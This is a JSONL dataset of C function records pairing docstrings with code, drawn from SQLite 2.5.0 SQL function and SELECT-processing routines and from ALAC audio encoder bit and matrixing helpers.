{"docstring": "/*\n** Implementation of the NULLIF(x,y) function.  The result is the first\n** argument if the arguments are different.  The result is NULL if the\n** arguments are equal to each other.\n*/\n", "func_signal": "static void nullifFunc(sqlite_func *context, int argc, const char **argv)", "code": "{\n  if( argv[0]!=0 && sqliteCompare(argv[0],argv[1])!=0 ){\n    sqlite_set_result_string(context, argv[0], -1);\n  }\n}", "path": "src\\func.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
{"docstring": "/*\n** Routines to implement min() and max() aggregate functions.\n*/\n", "func_signal": "static void minStep(sqlite_func *context, int argc, const char **argv)", "code": "{\n  MinMaxCtx *p;\n  p = sqlite_aggregate_context(context, sizeof(*p));\n  if( p==0 || argc<1 || argv[0]==0 ) return;\n  if( p->z==0 || sqliteCompare(argv[0],p->z)<0 ){\n    int len;\n    if( p->z && p->z!=p->zBuf ){\n      sqliteFree(p->z);\n    }\n    len = strlen(argv[0]);\n    if( len < sizeof(p->zBuf) ){\n      p->z = p->zBuf;\n    }else{\n      p->z = sqliteMalloc( len+1 );\n      if( p->z==0 ) return;\n    }\n    strcpy(p->z, argv[0]);\n  }\n}", "path": "src\\func.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
{"docstring": "/*\n** Implementation of the round() function\n*/\n", "func_signal": "static void roundFunc(sqlite_func *context, int argc, const char **argv)", "code": "{\n  int n;\n  double r;\n  char zBuf[100];\n  assert( argc==1 || argc==2 );\n  if( argv[0]==0 || (argc==2 && argv[1]==0) ) return;\n  n = argc==2 ? atoi(argv[1]) : 0;\n  if( n>30 ) n = 30;\n  if( n<0 ) n = 0;\n  r = atof(argv[0]);\n  sprintf(zBuf,\"%.*f\",n,r);\n  sqlite_set_result_string(context, zBuf, -1);\n}", "path": "src\\func.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
{"docstring": "/*\n** Routines to implement the count() aggregate function.\n*/\n", "func_signal": "static void countStep(sqlite_func *context, int argc, const char **argv)", "code": "{\n  CountCtx *p;\n  p = sqlite_aggregate_context(context, sizeof(*p));\n  if( (argc==0 || argv[0]) && p ){\n    p->n++;\n  }\n}", "path": "src\\func.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
{"docstring": "/*\n** For the given SELECT statement, do three things.\n**\n**    (1)  Fill in the pTabList->a[].pTab fields in the SrcList that\n**         defines the set of tables that should be scanned.\n**\n**    (2)  Add terms to the WHERE clause to accomodate the NATURAL keyword\n**         on joins and the ON and USING clause of joins.\n**\n**    (3)  Scan the list of columns in the result set (pEList) looking\n**         for instances of the \"*\" operator or the TABLE.* operator.\n**         If found, expand each \"*\" to be every column in every table\n**         and TABLE.* to be every column in TABLE.\n**\n** Return 0 on success.  If there are problems, leave an error message\n** in pParse and return non-zero.\n*/\n", "func_signal": "int fillInColumnList(Parse *pParse, Select *p)", "code": "{\n  int i, j, k, rc;\n  SrcList *pTabList;\n  ExprList *pEList;\n  Table *pTab;\n\n  if( p==0 || p->pSrc==0 ) return 1;\n  pTabList = p->pSrc;\n  pEList = p->pEList;\n\n  /* Look up every table in the table list.\n  */\n  for(i=0; i<pTabList->nSrc; i++){\n    if( pTabList->a[i].pTab ){\n      /* This routine has run before!  No need to continue */\n      return 0;\n    }\n    if( pTabList->a[i].zName==0 ){\n      /* A sub-query in the FROM clause of a SELECT */\n      assert( pTabList->a[i].pSelect!=0 );\n      if( pTabList->a[i].zAlias==0 ){\n        char zFakeName[60];\n        sprintf(zFakeName, \"sqlite_subquery_%p_\",\n           (void*)pTabList->a[i].pSelect);\n        sqliteSetString(&pTabList->a[i].zAlias, zFakeName, 0);\n      }\n      pTabList->a[i].pTab = pTab =\n        sqliteResultSetOfSelect(pParse, pTabList->a[i].zAlias,\n                                        pTabList->a[i].pSelect);\n      if( pTab==0 ){\n        return 1;\n      }\n      pTab->isTransient = 1;\n    }else{\n      /* An ordinary table or view name in the FROM clause */\n      pTabList->a[i].pTab = pTab =\n        sqliteFindTable(pParse->db, pTabList->a[i].zName);\n      if( pTab==0 ){\n        sqliteSetString(&pParse->zErrMsg, \"no such table: \",\n           pTabList->a[i].zName, 0);\n        pParse->nErr++;\n        return 1;\n      }\n      if( pTab->pSelect ){\n        if( sqliteViewGetColumnNames(pParse, pTab) ){\n          return 1;\n        }\n        pTabList->a[i].pSelect = sqliteSelectDup(pTab->pSelect);\n      }\n    }\n  }\n\n  /* Process NATURAL keywords, and ON and USING clauses of joins.\n  */\n  if( sqliteProcessJoin(pParse, p) ) return 1;\n\n  /* For every \"*\" that occurs in the column list, insert the names of\n  ** all columns in all tables.  And for every TABLE.* insert the names\n  ** of all columns in TABLE.  The parser inserted a special expression\n  ** with the TK_ALL operator for each \"*\" that it found in the column list.\n  ** The following code just has to locate the TK_ALL expressions and expand\n  ** each one to the list of all columns in all tables.\n  **\n  ** The first loop just checks to see if there are any \"*\" operators\n  ** that need expanding.\n  */\n  for(k=0; k<pEList->nExpr; k++){\n    Expr *pE = pEList->a[k].pExpr;\n    if( pE->op==TK_ALL ) break;\n    if( pE->op==TK_DOT && pE->pRight && pE->pRight->op==TK_ALL\n         && pE->pLeft && pE->pLeft->op==TK_ID ) break;\n  }\n  rc = 0;\n  if( k<pEList->nExpr ){\n    /*\n    ** If we get here it means the result set contains one or more \"*\"\n    ** operators that need to be expanded.  Loop through each expression\n    ** in the result set and expand them one by one.\n    */\n    struct ExprList_item *a = pEList->a;\n    ExprList *pNew = 0;\n    for(k=0; k<pEList->nExpr; k++){\n      Expr *pE = a[k].pExpr;\n      if( pE->op!=TK_ALL &&\n           (pE->op!=TK_DOT || pE->pRight==0 || pE->pRight->op!=TK_ALL) ){\n        /* This particular expression does not need to be expanded.\n        */\n        pNew = sqliteExprListAppend(pNew, a[k].pExpr, 0);\n        pNew->a[pNew->nExpr-1].zName = a[k].zName;\n        a[k].pExpr = 0;\n        a[k].zName = 0;\n      }else{\n        /* This expression is a \"*\" or a \"TABLE.*\" and needs to be\n        ** expanded. */\n        int tableSeen = 0;      /* Set to 1 when TABLE matches */\n        Token *pName;           /* text of name of TABLE */\n        if( pE->op==TK_DOT && pE->pLeft ){\n          pName = &pE->pLeft->token;\n        }else{\n          pName = 0;\n        }\n        for(i=0; i<pTabList->nSrc; i++){\n          Table *pTab = pTabList->a[i].pTab;\n          char *zTabName = pTabList->a[i].zAlias;\n          if( zTabName==0 || zTabName[0]==0 ){\n            zTabName = pTab->zName;\n          }\n          if( pName && (zTabName==0 || zTabName[0]==0 ||\n                 sqliteStrNICmp(pName->z, zTabName, pName->n)!=0 ||\n                 zTabName[pName->n]!=0) ){\n            continue;\n          }\n          tableSeen = 1;\n          for(j=0; j<pTab->nCol; j++){\n            Expr *pExpr, *pLeft, *pRight;\n            char *zName = pTab->aCol[j].zName;\n\n            if( i>0 && (pTabList->a[i-1].jointype & JT_NATURAL)!=0 &&\n                columnIndex(pTabList->a[i-1].pTab, zName)>=0 ){\n              /* In a NATURAL join, omit the join columns from the\n              ** table on the right */\n              continue;\n            }\n            if( i>0 && sqliteIdListIndex(pTabList->a[i-1].pUsing, zName)>=0 ){\n              /* In a join with a USING clause, omit columns in the\n              ** using clause from the table on the right. */\n              continue;\n            }\n            pRight = sqliteExpr(TK_ID, 0, 0, 0);\n            if( pRight==0 ) break;\n            pRight->token.z = zName;\n            pRight->token.n = strlen(zName);\n            if( zTabName ){\n              pLeft = sqliteExpr(TK_ID, 0, 0, 0);\n              if( pLeft==0 ) break;\n              pLeft->token.z = zTabName;\n              pLeft->token.n = strlen(zTabName);\n              pExpr = sqliteExpr(TK_DOT, pLeft, pRight, 0);\n              if( pExpr==0 ) break;\n            }else{\n              pExpr = pRight;\n              pExpr->span = pExpr->token;\n            }\n            pNew = sqliteExprListAppend(pNew, pExpr, 0);\n          }\n        }\n        if( !tableSeen ){\n          if( pName ){\n            sqliteSetNString(&pParse->zErrMsg, \"no such table: \", -1,\n              pName->z, pName->n, 0);\n          }else{\n            sqliteSetString(&pParse->zErrMsg, \"no tables specified\", 0);\n          }\n          rc = 1;\n        }\n      }\n    }\n    sqliteExprListDelete(pEList);\n    p->pEList = pNew;\n  }\n  return rc;\n}", "path": "src\\select.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
{"docstring": "/*\n** Get a VDBE for the given parser context.  Create a new one if necessary.\n** If an error occurs, return NULL and leave a message in pParse.\n*/\n", "func_signal": "Vdbe *sqliteGetVdbe(Parse *pParse)", "code": "{\n  Vdbe *v = pParse->pVdbe;\n  if( v==0 ){\n    v = pParse->pVdbe = sqliteVdbeCreate(pParse->db);\n  }\n  return v;\n}", "path": "src\\select.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
{"docstring": "/*\n** Return the index of a column in a table.  Return -1 if the column\n** is not contained in the table.\n*/\n", "func_signal": "static int columnIndex(Table *pTab, const char *zCol)", "code": "{\n  int i;\n  for(i=0; i<pTab->nCol; i++){\n    if( sqliteStrICmp(pTab->aCol[i].zName, zCol)==0 ) return i;\n  }\n  return -1;\n}", "path": "src\\select.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
{"docstring": "/*\n** Scan through the expression pExpr.  Replace every reference to\n** a column in table number iTable with a copy of the corresponding\n** entry in pEList.  (But leave references to the ROWID column\n** unchanged.)  When making a copy of an expression in pEList, change\n** references to columns in table iSub into references to table iTable.\n**\n** This routine is part of the flattening procedure.  A subquery\n** whose result set is defined by pEList appears as entry in the\n** FROM clause of a SELECT such that the VDBE cursor assigned to that\n** FORM clause entry is iTable.  This routine make the necessary\n** changes to pExpr so that it refers directly to the source table\n** of the subquery rather the result set of the subquery.\n*/\n", "func_signal": "static void substExpr(Expr *pExpr, int iTable, ExprList *pEList, int iSub)", "code": "{\n  if( pExpr==0 ) return;\n  if( pExpr->op==TK_COLUMN && pExpr->iTable==iTable && pExpr->iColumn>=0 ){\n    Expr *pNew;\n    assert( pEList!=0 && pExpr->iColumn<pEList->nExpr );\n    assert( pExpr->pLeft==0 && pExpr->pRight==0 && pExpr->pList==0 );\n    pNew = pEList->a[pExpr->iColumn].pExpr;\n    assert( pNew!=0 );\n    pExpr->op = pNew->op;\n    pExpr->pLeft = sqliteExprDup(pNew->pLeft);\n    pExpr->pRight = sqliteExprDup(pNew->pRight);\n    pExpr->pList = sqliteExprListDup(pNew->pList);\n    pExpr->iTable = pNew->iTable;\n    pExpr->iColumn = pNew->iColumn;\n    pExpr->iAgg = pNew->iAgg;\n    pExpr->token = pNew->token;\n    if( iSub!=iTable ){\n      changeTables(pExpr, iSub, iTable);\n    }\n  }else{\n    void substExprList(ExprList*,int,ExprList*,int);\n    substExpr(pExpr->pLeft, iTable, pEList, iSub);\n    substExpr(pExpr->pRight, iTable, pEList, iSub);\n    substExprList(pExpr->pList, iTable, pEList, iSub);\n  }\n}", "path": "src\\select.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
{"docstring": "/*\n** Routines used to compute the sum or average.\n*/\n", "func_signal": "static void sumStep(sqlite_func *context, int argc, const char **argv)", "code": "{\n  SumCtx *p;\n  if( argc<1 ) return;\n  p = sqlite_aggregate_context(context, sizeof(*p));\n  if( p && argv[0] ){\n    p->sum += atof(argv[0]);\n    p->cnt++;\n  }\n}", "path": "src\\func.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
{"docstring": "/*\n** Implementation of the glob() SQL function.  This function implements\n** the build-in GLOB operator.  The first argument to the function is the\n** string and the second argument is the pattern.  So, the SQL statements:\n**\n**       A GLOB B\n**\n** is implemented as glob(A,B).\n*/\n", "func_signal": "static void globFunc(sqlite_func *context, int arg, const char **argv)", "code": "{\n  if( argv[0]==0 || argv[1]==0 ) return;\n  sqlite_set_result_int(context, sqliteGlobCompare(argv[0], argv[1]));\n}", "path": "src\\func.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
{"docstring": "/*\n** Given a SELECT statement, generate a Table structure that describes\n** the result set of that SELECT.\n*/\n", "func_signal": "Table *sqliteResultSetOfSelect(Parse *pParse, char *zTabName, Select *pSelect)", "code": "{\n  Table *pTab;\n  int i;\n  ExprList *pEList;\n  int fillInColumnList(Parse*, Select*);\n\n  if( fillInColumnList(pParse, pSelect) ){\n    return 0;\n  }\n  pTab = sqliteMalloc( sizeof(Table) );\n  if( pTab==0 ){\n    return 0;\n  }\n  pTab->zName = zTabName ? sqliteStrDup(zTabName) : 0;\n  pEList = pSelect->pEList;\n  pTab->nCol = pEList->nExpr;\n  assert( pTab->nCol>0 );\n  pTab->aCol = sqliteMalloc( sizeof(pTab->aCol[0])*pTab->nCol );\n  for(i=0; i<pTab->nCol; i++){\n    Expr *p;\n    if( pEList->a[i].zName ){\n      pTab->aCol[i].zName = sqliteStrDup(pEList->a[i].zName);\n    }else if( (p=pEList->a[i].pExpr)->span.z && p->span.z[0] ){\n      sqliteSetNString(&pTab->aCol[i].zName, p->span.z, p->span.n, 0);\n    }else if( p->op==TK_DOT && p->pRight && p->pRight->token.z &&\n           p->pRight->token.z[0] ){\n      sqliteSetNString(&pTab->aCol[i].zName,\n           p->pRight->token.z, p->pRight->token.n, 0);\n    }else{\n      char zBuf[30];\n      sprintf(zBuf, \"column%d\", i+1);\n      pTab->aCol[i].zName = sqliteStrDup(zBuf);\n    }\n  }\n  pTab->iPKey = -1;\n  return pTab;\n}", "path": "src\\select.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
{"docstring": "/*\n** If the inner loop was generated using a non-null pOrderBy argument,\n** then the results were placed in a sorter.  After the loop is terminated\n** we need to run the sorter and output the results.  The following\n** routine generates the code needed to do that.\n*/\n", "func_signal": "static void generateSortTail(Select *p, Vdbe *v, int nColumn)", "code": "{\n  int end = sqliteVdbeMakeLabel(v);\n  int addr;\n  sqliteVdbeAddOp(v, OP_Sort, 0, 0);\n  addr = sqliteVdbeAddOp(v, OP_SortNext, 0, end);\n  if( p->nOffset>0 ){\n    sqliteVdbeAddOp(v, OP_LimitCk, 1, addr);\n  }\n  if( p->nLimit>0 ){\n    sqliteVdbeAddOp(v, OP_LimitCk, 0, end);\n  }\n  sqliteVdbeAddOp(v, OP_SortCallback, nColumn, 0);\n  sqliteVdbeAddOp(v, OP_Goto, 0, addr);\n  sqliteVdbeResolveLabel(v, end);\n  sqliteVdbeAddOp(v, OP_SortReset, 0, 0);\n}", "path": "src\\select.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
{"docstring": "/*\n** Analyze the SELECT statement passed in as an argument to see if it\n** is a simple min() or max() query.  If it is and this query can be\n** satisfied using a single seek to the beginning or end of an index,\n** then generate the code for this SELECT return 1.  If this is not a\n** simple min() or max() query, then return 0;\n**\n** A simply min() or max() query looks like this:\n**\n**    SELECT min(a) FROM table;\n**    SELECT max(a) FROM table;\n**\n** The query may have only a single table in its FROM argument.  There\n** can be no GROUP BY or HAVING or WHERE clauses.  The result set must\n** be the min() or max() of a single column of the table.  The column\n** in the min() or max() function must be indexed.\n**\n** The parameters to this routine are the same as for sqliteSelect().\n** See the header comment on that routine for additional information.\n*/\n", "func_signal": "static int simpleMinMaxQuery(Parse *pParse, Select *p, int eDest, int iParm)", "code": "{\n  Expr *pExpr;\n  int iCol;\n  Table *pTab;\n  Index *pIdx;\n  int base;\n  Vdbe *v;\n  int openOp;\n  int seekOp;\n  int cont;\n  ExprList eList;\n  struct ExprList_item eListItem;\n\n  /* Check to see if this query is a simple min() or max() query.  Return\n  ** zero if it is  not.\n  */\n  if( p->pGroupBy || p->pHaving || p->pWhere ) return 0;\n  if( p->pSrc->nSrc!=1 ) return 0;\n  if( p->pEList->nExpr!=1 ) return 0;\n  pExpr = p->pEList->a[0].pExpr;\n  if( pExpr->op!=TK_AGG_FUNCTION ) return 0;\n  if( pExpr->pList==0 || pExpr->pList->nExpr!=1 ) return 0;\n  if( pExpr->token.n!=3 ) return 0;\n  if( sqliteStrNICmp(pExpr->token.z,\"min\",3)==0 ){\n    seekOp = OP_Rewind;\n  }else if( sqliteStrNICmp(pExpr->token.z,\"max\",3)==0 ){\n    seekOp = OP_Last;\n  }else{\n    return 0;\n  }\n  pExpr = pExpr->pList->a[0].pExpr;\n  if( pExpr->op!=TK_COLUMN ) return 0;\n  iCol = pExpr->iColumn;\n  pTab = p->pSrc->a[0].pTab;\n\n  /* If we get to here, it means the query is of the correct form.\n  ** Check to make sure we have an index and make pIdx point to the\n  ** appropriate index.  If the min() or max() is on an INTEGER PRIMARY\n  ** key column, no index is necessary so set pIdx to NULL.  If no\n  ** usable index is found, return 0.\n  */\n  if( iCol<0 ){\n    pIdx = 0;\n  }else{\n    for(pIdx=pTab->pIndex; pIdx; pIdx=pIdx->pNext){\n      assert( pIdx->nColumn>=1 );\n      if( pIdx->aiColumn[0]==iCol ) break;\n    }\n    if( pIdx==0 ) return 0;\n  }\n\n  /* Identify column names if we will be using the callback.  This\n  ** step is skipped if the output is going to a table or a memory cell.\n  */\n  v = sqliteGetVdbe(pParse);\n  if( v==0 ) return 0;\n  if( eDest==SRT_Callback ){\n    generateColumnNames(pParse, p->base, p->pSrc, p->pEList);\n  }\n\n  /* Generating code to find the min or the max.  Basically all we have\n  ** to do is find the first or the last entry in the chosen index.  If\n  ** the min() or max() is on the INTEGER PRIMARY KEY, then find the first\n  ** or last entry in the main table.\n  */\n  if( !pParse->schemaVerified && (pParse->db->flags & SQLITE_InTrans)==0 ){\n    sqliteVdbeAddOp(v, OP_VerifyCookie, pParse->db->schema_cookie, 0);\n    pParse->schemaVerified = 1;\n  }\n  openOp = pTab->isTemp ? OP_OpenAux : OP_Open;\n  base = p->base;\n  sqliteVdbeAddOp(v, openOp, base, pTab->tnum);\n  sqliteVdbeChangeP3(v, -1, pTab->zName, P3_STATIC);\n  if( pIdx==0 ){\n    sqliteVdbeAddOp(v, seekOp, base, 0);\n  }else{\n    sqliteVdbeAddOp(v, openOp, base+1, pIdx->tnum);\n    sqliteVdbeChangeP3(v, -1, pIdx->zName, P3_STATIC);\n    sqliteVdbeAddOp(v, seekOp, base+1, 0);\n    sqliteVdbeAddOp(v, OP_IdxRecno, base+1, 0);\n    sqliteVdbeAddOp(v, OP_Close, base+1, 0);\n    sqliteVdbeAddOp(v, OP_MoveTo, base, 0);\n  }\n  eList.nExpr = 1;\n  memset(&eListItem, 0, sizeof(eListItem));\n  eList.a = &eListItem;\n  eList.a[0].pExpr = pExpr;\n  cont = sqliteVdbeMakeLabel(v);\n  selectInnerLoop(pParse, p, &eList, base, 1, 0, -1, eDest, iParm, cont, cont);\n  sqliteVdbeResolveLabel(v, cont);\n  sqliteVdbeAddOp(v, OP_Close, base, 0);\n  return 1;\n}", "path": "src\\select.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
{"docstring": "/*\n** Implementation of the like() SQL function.  This function implements\n** the build-in LIKE operator.  The first argument to the function is the\n** string and the second argument is the pattern.  So, the SQL statements:\n**\n**       A LIKE B\n**\n** is implemented as like(A,B).\n*/\n", "func_signal": "static void likeFunc(sqlite_func *context, int arg, const char **argv)", "code": "{\n  if( argv[0]==0 || argv[1]==0 ) return;\n  sqlite_set_result_int(context, sqliteLikeCompare(argv[0], argv[1]));\n}", "path": "src\\func.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
{"docstring": "/* Omit because math library is required */\n/*\n** Routines used to compute the standard deviation as an aggregate.\n*/\n", "func_signal": "static void stdDevStep(sqlite_func *context, int argc, const char **argv)", "code": "{\n  StdDevCtx *p;\n  double x;\n  if( argc<1 ) return;\n  p = sqlite_aggregate_context(context, sizeof(*p));\n  if( p && argv[0] ){\n    x = atof(argv[0]);\n    p->sum += x;\n    p->sum2 += x*x;\n    p->cnt++;\n  }\n}", "path": "src\\func.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
{"docstring": "/*\n** This routine processes the join information for a SELECT statement.\n** ON and USING clauses are converted into extra terms of the WHERE clause.\n** NATURAL joins also create extra WHERE clause terms.\n**\n** This routine returns the number of errors encountered.\n*/\n", "func_signal": "static int sqliteProcessJoin(Parse *pParse, Select *p)", "code": "{\n  SrcList *pSrc;\n  int i, j;\n  pSrc = p->pSrc;\n  for(i=0; i<pSrc->nSrc-1; i++){\n    struct SrcList_item *pTerm = &pSrc->a[i];\n    struct SrcList_item *pOther = &pSrc->a[i+1];\n\n    if( pTerm->pTab==0 || pOther->pTab==0 ) continue;\n\n    /* When the NATURAL keyword is present, add WHERE clause terms for\n    ** every column that the two tables have in common.\n    */\n    if( pTerm->jointype & JT_NATURAL ){\n      Table *pTab;\n      if( pTerm->pOn || pTerm->pUsing ){\n        sqliteSetString(&pParse->zErrMsg, \"a NATURAL join may not have \"\n           \"an ON or USING clause\", 0);\n        pParse->nErr++;\n        return 1;\n      }\n      pTab = pTerm->pTab;\n      for(j=0; j<pTab->nCol; j++){\n        if( columnIndex(pOther->pTab, pTab->aCol[j].zName)>=0 ){\n          addWhereTerm(pTab->aCol[j].zName, pTab, pOther->pTab, &p->pWhere);\n        }\n      }\n    }\n\n    /* Disallow both ON and USING clauses in the same join\n    */\n    if( pTerm->pOn && pTerm->pUsing ){\n      sqliteSetString(&pParse->zErrMsg, \"cannot have both ON and USING \"\n        \"clauses in the same join\", 0);\n      pParse->nErr++;\n      return 1;\n    }\n\n    /* Add the ON clause to the end of the WHERE clause, connected by\n    ** and AND operator.\n    */\n    if( pTerm->pOn ){\n      if( p->pWhere==0 ){\n        p->pWhere = pTerm->pOn;\n      }else{\n        p->pWhere = sqliteExpr(TK_AND, p->pWhere, pTerm->pOn, 0);\n      }\n      pTerm->pOn = 0;\n    }\n\n    /* Create extra terms on the WHERE clause for each column named\n    ** in the USING clause.  Example: If the two tables to be joined are\n    ** A and B and the USING clause names X, Y, and Z, then add this\n    ** to the WHERE clause:    A.X=B.X AND A.Y=B.Y AND A.Z=B.Z\n    ** Report an error if any column mentioned in the USING clause is\n    ** not contained in both tables to be joined.\n    */\n    if( pTerm->pUsing ){\n      IdList *pList;\n      int j;\n      assert( i<pSrc->nSrc-1 );\n      pList = pTerm->pUsing;\n      for(j=0; j<pList->nId; j++){\n        if( columnIndex(pTerm->pTab, pList->a[i].zName)<0 ||\n            columnIndex(pOther->pTab, pList->a[i].zName)<0 ){\n          sqliteSetString(&pParse->zErrMsg, \"cannot join using column \",\n            pList->a[i].zName, \" - column not present in both tables\", 0);\n          pParse->nErr++;\n          return 1;\n        }\n        addWhereTerm(pList->a[i].zName, pTerm->pTab, pOther->pTab, &p->pWhere);\n      }\n    }\n  }\n  return 0;\n}", "path": "src\\select.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
{"docstring": "// 20/24-bit <-> 32-bit helper routines (not really matrixing but convenient to put here)\n", "func_signal": "void copy20ToPredictor( uint8_t * in, uint32_t stride, int32_t * out, int32_t numSamples )", "code": "{\n\tuint8_t *\tip = in;\n\tint32_t\t\t\tj;\n\n\tfor ( j = 0; j < numSamples; j++ )\n\t{\n\t\tint32_t\t\t\tval;\n\n\t\t// 20-bit values are left-aligned in the 24-bit input buffer but right-aligned in the 32-bit output buffer\n\t\tval = (int32_t)( ((uint32_t)ip[HBYTE] << 16) | ((uint32_t)ip[MBYTE] << 8) | (uint32_t)ip[LBYTE] );\n\t\tout[j] = (val << 8) >> 12;\n\t\tip += stride * 3;\n\t}\n}", "path": "alac\\matrix_enc.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
{"docstring": "// BitBufferAdvance\n//\n", "func_signal": "void BitBufferAdvance( BitBuffer * bits, uint32_t numBits )", "code": "{\n\tif ( numBits )\n\t{\n\t\tbits->bitIndex += numBits;\n\t\tbits->cur += (bits->bitIndex >> 3);\n\t\tbits->bitIndex &= 7;\n\t}\n}", "path": "alac\\ALACBitUtilities.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
{"docstring": "// 24-bit routines\n// - the 24 bits of data are right-justified in the input/output predictor buffers\n", "func_signal": "void mix24( uint8_t * in, uint32_t stride, int32_t * u, int32_t * v, int32_t numSamples,\n\t\t\tint32_t mixbits, int32_t mixres, uint16_t * shiftUV, int32_t bytesShifted )", "code": "{\t\n\tint32_t\t\tl, r;\n\tuint8_t *\tip = in;\n\tint32_t\t\t\tshift = bytesShifted * 8;\n\tuint32_t\tmask  = (1ul << shift) - 1;\n\tint32_t\t\t\tj, k;\n\n\tif ( mixres != 0 )\n\t{\n\t\t/* matrixed stereo */\n\t\tint32_t\t\tmod = 1 << mixbits;\n\t\tint32_t\t\tm2 = mod - mixres;\n\n\t\tif ( bytesShifted != 0 )\n\t\t{\n\t\t\tfor ( j = 0, k = 0; j < numSamples; j++, k += 2 )\n\t\t\t{\n\t\t\t\tl = (int32_t)( ((uint32_t)ip[HBYTE] << 16) | ((uint32_t)ip[MBYTE] << 8) | (uint32_t)ip[LBYTE] );\n\t\t\t\tl = (l << 8) >> 8;\n\t\t\t\tip += 3;\n\n\t\t\t\tr = (int32_t)( ((uint32_t)ip[HBYTE] << 16) | ((uint32_t)ip[MBYTE] << 8) | (uint32_t)ip[LBYTE] );\n\t\t\t\tr = (r << 8) >> 8;\n\t\t\t\tip += (stride - 1) * 3;\n\n\t\t\t\tshiftUV[k + 0] = (uint16_t)(l & mask);\n\t\t\t\tshiftUV[k + 1] = (uint16_t)(r & mask);\n\t\t\t\t\n\t\t\t\tl >>= shift;\n\t\t\t\tr >>= shift;\n\n\t\t\t\tu[j] = (mixres * l + m2 * r) >> mixbits;\n\t\t\t\tv[j] = l - r;\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tfor ( j = 0; j < numSamples; j++ )\n\t\t\t{\n\t\t\t\tl = (int32_t)( ((uint32_t)ip[HBYTE] << 16) | ((uint32_t)ip[MBYTE] << 8) | (uint32_t)ip[LBYTE] );\n\t\t\t\tl = (l << 8) >> 8;\n\t\t\t\tip += 3;\n\n\t\t\t\tr = (int32_t)( ((uint32_t)ip[HBYTE] << 16) | ((uint32_t)ip[MBYTE] << 8) | (uint32_t)ip[LBYTE] );\n\t\t\t\tr = (r << 8) >> 8;\n\t\t\t\tip += (stride - 1) * 3;\n\n\t\t\t\tu[j] = (mixres * l + m2 * r) >> mixbits;\n\t\t\t\tv[j] = l - r;\n\t\t\t}\n\t\t}\n\t}\n\telse\n\t{\n\t\t/* Conventional separated stereo. */\n\t\tif ( bytesShifted != 0 )\n\t\t{\n\t\t\tfor ( j = 0, k = 0; j < numSamples; j++, k += 2 )\n\t\t\t{\n\t\t\t\tl = (int32_t)( ((uint32_t)ip[HBYTE] << 16) | ((uint32_t)ip[MBYTE] << 8) | (uint32_t)ip[LBYTE] );\n\t\t\t\tl = (l << 8) >> 8;\n\t\t\t\tip += 3;\n\n\t\t\t\tr = (int32_t)( ((uint32_t)ip[HBYTE] << 16) | ((uint32_t)ip[MBYTE] << 8) | (uint32_t)ip[LBYTE] );\n\t\t\t\tr = (r << 8) >> 8;\n\t\t\t\tip += (stride - 1) * 3;\n\n\t\t\t\tshiftUV[k + 0] = (uint16_t)(l & mask);\n\t\t\t\tshiftUV[k + 1] = (uint16_t)(r & mask);\n\t\t\t\t\n\t\t\t\tl >>= shift;\n\t\t\t\tr >>= shift;\n\n\t\t\t\tu[j] = l;\n\t\t\t\tv[j] = r;\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tfor ( j = 0; j < numSamples; j++ )\n\t\t\t{\n\t\t\t\tl = (int32_t)( ((uint32_t)ip[HBYTE] << 16) | ((uint32_t)ip[MBYTE] << 8) | (uint32_t)ip[LBYTE] );\n\t\t\t\tu[j] = (l << 8) >> 8;\n\t\t\t\tip += 3;\n\n\t\t\t\tr = (int32_t)( ((uint32_t)ip[HBYTE] << 16) | ((uint32_t)ip[MBYTE] << 8) | (uint32_t)ip[LBYTE] );\n\t\t\t\tv[j] = (r << 8) >> 8;\n\t\t\t\tip += (stride - 1) * 3;\n\t\t\t}\n\t\t}\n\t}\n}", "path": "alac\\matrix_enc.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
{"docstring": "// BitBufferPeek\n//\n", "func_signal": "uint32_t BitBufferPeek( BitBuffer * bits, uint8_t numBits )", "code": "{\n\treturn ((((((uint32_t) bits->cur[0] << 16) | ((uint32_t) bits->cur[1] << 8) |\n\t\t\t((uint32_t) bits->cur[2])) << bits->bitIndex) & 0x00FFFFFF) >> (24 - numBits));\n}", "path": "alac\\ALACBitUtilities.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
